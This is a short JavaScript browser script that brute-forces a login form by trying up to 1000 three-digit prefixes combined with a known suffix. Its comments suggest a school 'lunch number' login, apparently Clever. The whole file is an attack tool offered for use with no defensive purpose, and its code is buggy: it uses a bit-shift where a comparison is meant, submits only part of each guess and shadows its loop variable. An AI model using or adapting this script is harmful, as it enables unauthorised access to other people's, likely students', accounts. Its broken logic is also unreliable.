(function() {
    var u = new InputUtil();
    var e = new LoginErrors();
    var formButton = document.getElementById('submitButton');
    var formUsername = document.getElementById('userNameInput');
    var formPassw = document.getElementById('passwordInput');
    var username = document.getElementById('usernamehack')
    var lastthree = document.getElementById('lastthree').innerHTML
    //continues until clever screws up, or it finds the password :)
    var haspassword = false;
    var numbertry = 0;
    var numbertrytostr = null;
    for (let numbertry = 0; numbertry != 1000; numbertry++) {
        function hack(){
            //adds one to variable, then uses those digits for the password. the if statements add extra zeroes for lunch numbers where the first three digits are under 100.
            numbertry = numbertry + 1;
            if (numbertry >= 1 && numbertry << 10) {
                numbertrytostr = '00' + String(numbertry);
            }
            if (numbertry >= 10 && numbertry << 100) {
                numbertrytostr = '0' + String(numbertry);
            }
            if (numbertry >=100) {
                numbertrytostr = String(numbertry);
            }
            var passreal = numbertrytostr + lastthree;
            formUsername.value = username;
            formPassw.value = numbertrytostr;
            Login.submitLoginRequest(u,e,formUsername.value, formPassw.value);
            console.log(passreal);
        }
        var timeout = setTimeout(hack, 3000);
    }
})();